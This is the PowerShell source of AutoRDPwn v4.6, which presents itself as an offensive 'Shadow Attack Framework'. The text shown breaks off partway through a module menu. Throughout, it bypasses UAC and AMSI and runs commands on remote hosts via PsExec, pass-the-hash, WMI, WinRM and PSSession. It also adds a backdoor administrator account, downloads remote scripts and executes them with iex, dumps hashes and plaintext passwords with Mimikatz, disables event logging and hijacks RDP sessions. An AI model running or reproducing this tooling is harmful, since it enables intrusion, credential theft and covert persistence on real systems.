[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1" -UseBasicParsing | iex
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico" -OutFile AutoRDPwn.ico -UseBasicParsing ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1" -OutFile Set-ConsoleIcon.ps1 -UseBasicParsing ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.6 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off

function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host
     Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
     Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
     Write-Host " /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/| |    \  |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
     Write-Host "/  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \| |____/  |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host "\  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_________/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host " \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/                " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
     Write-Host
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.6" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host }

function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
     Write-Host }

function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - InvokeCommand / PSSession" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Session Hijacking (local)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt0" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt1" -ForegroundColor Gray
     Write-Host }

function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function Test-Command {
    Param ($command)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = 'stop'
    try {if(Get-Command $command){RETURN $true}}
    Catch {RETURN $false}
    Finally {$ErrorActionPreference=$oldPreference}}
    
    do { Show-Banner ; Show-Language
    $help = 'The detailed guide of use can be found at the following link:'
    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()
    switch ($input) { 
       '1' { $Language = 'English' } 
       '2' { $Language = 'Spanish' } 
       'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; sleep -milliseconds 7500 }
       'X' { continue }
    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
    $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()

if($Language -in 'English') {
  $txt0  = "Load additional modules"
  $txt1  = "Close the program"
  $txt2  = "Your version of Powershell is not compatible with this script :("
  $txt3  = "You can download the latest version here"
  $txt4  = "Your operating system is not compatible with this attack, choose another one"
  $txt5  = "Incorrect option, try again"
  $txt6  = "Choose how you want to launch the attack:` "
  $txt7  = "Choose the module you want to load:` "
  $txt8  = "Recover local hashes"
  $txt9  = "Recover plaintext passwords"
  $txt10 = "Rebuild the image cache"
  $txt11 = "Retrieve remote desktop history"
  $txt12 = "$system system detected, downloading Mimikatz.."
  $txt13 = "Redirect a new port"
  $txt14 = "Check actual redirections"
  $txt15 = "Semi-interactive console"
  $txt16 = "Deactivate system logs"
  $txt17 = "This process can take several minutes.."
  $txt18 = "Delete all redirections"
  $txt19 = "Module loaded successfully!"
  $txt20 = "Return to the main menu"
  $txt21 = "What is the IP of the server?:` "
  $txt22 = "And the user?:` "
  $txt23 = "Enter the password:` "
  $txt24 = "Enter the domain:` "
  $txt25 = "Finally, the NTLM hash:` "
  $txt26 = "Elevating privileges with token duplication.."
  $txt27 = "Do you want to see or control the computer?:` "
  $txt28 = "Modifying permissions to view the remote computer.."
  $txt29 = "Modifying permissions to control the remote computer.."
  $txt30 = "Changes in the Windows registry made successfully!"
  $txt31 = "Detecting operating system version on` "
  $txt32 = "detected"
  $txt33 = "Looking for active sessions on the computer.."
  $txt34 = "What session do you want to connect to?:` "
  $txt35 = "detected, applying patch.."
  $txt36 = "Starting remote connection!"
  $txt37 = "Semi-interactive console on remote computer"
  $txt38 = "Something went wrong, closing the program.."
  $txt39 = "Enter the local port:` "
  $txt40 = "Which interface do you want to use?:` "
  $txt41 = "Enter the remote port:` "
  $txt42 = "Finally, the destination IP:` "
  $txt43 = "Redirection created successfuly!"
  $txt44 = "There is no redirection to show"
  $txt45 = "All redirects have been deleted"
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; Set-ExecutionPolicy Unrestricted -Force"
  $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
  $Pwn4  = "netsh advfirewall firewall set rule group = 'Windows Management Instrumentation (WMI)' new enable = yes; netsh advfirewall firewall set rule group = 'Windows Remote Management' new enable = yes"
  $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
  $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
  $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
  $Pwn8  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName AutoRDPwn"
  $Pwn9  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
  $Pwn10 = "RDP session agent" }

if($Language -in 'Spanish') {
  $txt0  = "Cargar módulos adicionales"
  $txt1  = "Cerrar el programa"
  $txt2  = "Tu versión de Powershell no es compatible con este script :("
  $txt3  = "Puedes decargar la última versión aquí"
  $txt4  = "Tu sistema operativo no es compatible con este ataque, elige otro"
  $txt5  = "Opción incorrecta, vuelve a intentarlo de nuevo"
  $txt6  = "Elige cómo quieres lanzar el ataque:` "
  $txt7  = "Elige el módulo que quieres cargar:` "
  $txt8  = "Recuperar hashes locales"
  $txt9  = "Recuperar contraseñas en texto plano"
  $txt10 = "Reconstruir la caché de imágenes"
  $txt11 = "Recuperar historial de escritorio remoto"
  $txt12 = "Sistema de $system detectado, descargando Mimikatz.."
  $txt13 = "Redireccionar un puerto nuevo"
  $txt14 = "Consultar redirecciones creadas"
  $txt15 = "Consola semi-interactiva"
  $txt16 = "Desactivar logs del sistema"
  $txt17 = "Este proceso puede tardar varios minutos.."
  $txt18 = "Eliminar todas las redirecciones"
  $txt19 = "Módulo cargado con éxito!"
  $txt20 = "Volver al menú principal"
  $txt21 = "Cuál es la IP del servidor?:` "
  $txt22 = "Y el usuario?:` "
  $txt23 = "Escribe la contraseña:` "
  $txt24 = "Introduce el dominio:` "
  $txt25 = "Por último, el hash NTLM:` "
  $txt26 = "Elevando privilegios con token duplication.."
  $txt27 = "Quieres ver o controlar el equipo?:` "
  $txt28 = "Modificando permisos para visualizar el equipo remoto.."
  $txt29 = "Modificando permisos para controlar el equipo remoto.."
  $txt30 = "Cambios en el registro de Windows realizados con éxito!"
  $txt31 = "Detectando versión del sistema operativo en` "
  $txt32 = "detectado"
  $txt33 = "Buscando sesiones activas en el equipo.."
  $txt34 = "A qué sesión quieres conectarte?:` "
  $txt35 = "detectado, aplicando parche.."
  $txt36 = "Iniciando conexión remota!"
  $txt37 = "Consola semi-interactiva en equipo remoto"
  $txt38 = "Algo salió mal, cerrando el programa.."
  $txt39 = "Introduce el puerto local:` "
  $txt40 = "Qué interfaz quieres usar?:` "
  $txt41 = "Introduce el puerto remoto:` "
  $txt42 = "Por último, la IP de destino:` "
  $txt43 = "Redirección creada correctamente!"
  $txt44 = "No existe ninguna redirección para mostrar"
  $txt45 = "Todas las redirecciones han sido eliminadas"
  $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
  $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; Set-ExecutionPolicy Unrestricted -Force"
  $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
  $Pwn4  = "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
  $Pwn5  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName $user"
  $Pwn6  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName $user"
  $Pwn7  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
  $Pwn8  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemoteWMI.ps1 | iex ; Set-RemoteWMI -UserName AutoRDPwn"
  $Pwn9  = "Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Set-RemotePSRemoting.ps1 | iex ; Set-RemotePSRemoting -UserName AutoRDPwn"
  $Pwn10 = "Agente de sesión de RDP" }

    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host""
    if($Powershell -lt 5) { Write-Host "$txt2" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt3" -NoNewLine -ForegroundColor 'Red'
    Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -NoNewLine -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit } 
    else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
    if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AMSI } else { $null }}

    do { Show-Banner ; Show-Menu
    $Random = New-Object System.Random ; $txt6 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) { 

        '1' {
        Write-Host ; Write-Host "$txt21" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt22" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn4" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn5" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn6" -nobanner -accepteula
        del .\psexec.exe }

        '2' {
	Write-Host ; Write-Host "$txt21" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt22" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
        $domain = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
        $hash = $Host.UI.ReadLine()
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn6"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn7"
	Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn8"
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn9" }

	'3' {
        Write-Host ; Write-Host "$txt21" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt22" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn5"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn6" }

        '4' {
        Write-Host ; Write-Host "$txt21" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt22" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        $PSSession = New-PSSession -Computer $computer -credential $credential 
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn1 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn2 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn3 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn4 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn5 }
        Invoke-Command -Session $PSSession -ScriptBlock { powershell.exe $using:Pwn6 }}

        '5' {
        Write-Host ; Write-Host "$txt21" -NoNewLine -ForegroundColor Gray
        $computer = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt22" -NoNewLine -ForegroundColor Gray
        $user = $Host.UI.ReadLine()
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn4"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn5"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn6" }
	
	'6' {
        Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt26" -ForegroundColor Blue ; Write-Host       
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Get-System.ps1" -UseBasicParsing | iex
        Get-System -Technique Token ; Write-Host ; Write-Host "$using:txt33" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session ; Write-Host
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "$txt34" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine()
	tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        else{ Write-Host "$txt4" -ForegroundColor Red ; sleep -milliseconds 4000 ; $input = $null ; Show-Banner ; Show-Menu }}

        'M' { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Mimikatz" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt15" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt16" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Port Forwarding" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt1" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine() ; Write-Host
        
        if($module -like '1') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt8" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt1" -ForegroundColor Gray        
        Write-Host ; $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $mimikatz = $Host.UI.ReadLine() ; Write-Host

        if($mimikatz -like '1') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500
        Write-Host ; Write-Host "$txt12" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' 
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($mimikatz -like '2') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500	
        Write-Host ; Write-Host "$txt12" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' 
	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Mimikatz.ps1" -UseBasicParsing | iex
        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit"
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($mimikatz -like 'X'){ $input = 'x' ; continue }
        if($mimikatz -in '1','2','m') { $null } else { Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 }}
        if($module -like '2') { $console ="true" ; Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 }

        if($module -like '3') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
        Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($module -like '4') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt10" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt1" -ForegroundColor Gray        
        Write-Host ; $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host

        if($forensics -like '1') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt17" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex ; explorer $env:temp\Recovered_RDP_Session
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; sleep -milliseconds 2500 }

        if($forensics -like '2') { Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }
        
        if($forensics -like 'X'){ $input = 'x' ; continue }
        if($forensics -in '1','2','m') { $null } else { Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 2500 }}
        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt19" -ForegroundColor Green ; sleep -milliseconds 2500 }
	
        if($module -like '6') { Show-Banner
